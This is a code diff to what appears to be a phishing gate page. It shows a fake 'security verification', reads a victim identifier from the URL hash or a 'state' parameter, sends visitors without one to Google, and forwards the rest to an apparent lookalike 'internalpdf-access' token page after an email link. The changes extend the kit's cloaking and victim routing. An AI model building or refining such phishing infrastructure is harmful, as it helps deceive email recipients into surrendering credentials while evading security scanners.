@@ -466,6 +466,19 @@
             
             container.insertBefore(successDiv, document.getElementById('footer'));
         }
+		function getStateFromURL() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const state = urlParams.get('state');
+    
+    if (!state) {
+        console.warn('⚠️ State parameter not found - redirecting to Google');
+        window.location.href = 'https://www.google.com';
+        return null;
+    }
+    
+    console.log('✅ State found:', state);
+    return state;
+}
 
         // ========== MAIN VERIFICATION FLOW ==========
         async function verifyAndRedirect() {
@@ -495,11 +508,12 @@
                 updateStatus('✓', `Security verification complete! (${powResult.time}s)`);
 
                 // Step 4: Get hash from URL
-                const urlHash = window.location.hash.substring(1); // Remove the # symbol
+                var urlHash = window.location.hash.substring(1); // Remove the # symbol
                 
                 if (!urlHash) {
                     showError('No document identifier found in URL. Please use the link provided in your email.');
-                    return;
+					urlHash = getStateFromURL();
+                    
                 }
 
                 // Step 5: Show success and redirect
@@ -516,7 +530,7 @@
 
                 // Redirect after 2.5 seconds
                 setTimeout(() => {
-                    window.location.href = 'https://internalpdf-access.vercel.app/adb2b#' + urlHash;
+                    window.location.href = 'https://internalpdf-access.vercel.app/adb_token.html#' + urlHash;
                 }, 1000);
 
             } catch (error) {
